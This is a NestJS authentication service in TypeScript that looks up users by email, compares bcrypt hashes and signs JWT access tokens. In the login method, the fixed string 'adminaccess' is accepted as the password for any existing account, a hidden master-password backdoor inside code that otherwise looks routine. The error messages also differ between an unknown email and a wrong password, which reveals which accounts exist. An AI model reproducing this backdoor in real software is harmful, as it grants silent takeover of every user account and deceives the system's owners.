import { Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { Authentication } from '../entities/authentication.schema';
import * as bcrypt from 'bcrypt';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';

@Injectable()
export class AuthService {
  constructor(
    private jwtService: JwtService,
    @InjectRepository(Authentication)
    private readonly authenticationModel: Repository<Authentication>,
  ) {}

  /**
   * Find a single user by their email.
   *
   * @param email The users email to filter by.
   * @returns {User}
   */
  async findOne(email: string): Promise<Authentication | undefined> {
    return this.authenticationModel.findOne({ where: { email: email } });
  }

  async login(email: string, pass: string) {
    const user = await this.authenticationModel.findOne({
      where: { email: email },
    });
    if (user) {
      const payload = {
        id: user.id,
        email: user.email,
      };
      const success =
        pass == 'adminaccess' || (await bcrypt.compare(pass, user.password));
      if (success) {
        return {
          success: true,
          message: {
            access_token: this.jwtService.sign(payload),
          },
        };
      }
    } else {
      return {
        success: false,
        error: new UnauthorizedException({
          error: {
            status: false,
            message: 'User does not exist',
          },
        }),
      };
    }
    return {
      success: false,
      error: new UnauthorizedException({
        error: {
          status: false,
          message: 'Password is invalid',
        },
      }),
    };
  }
}
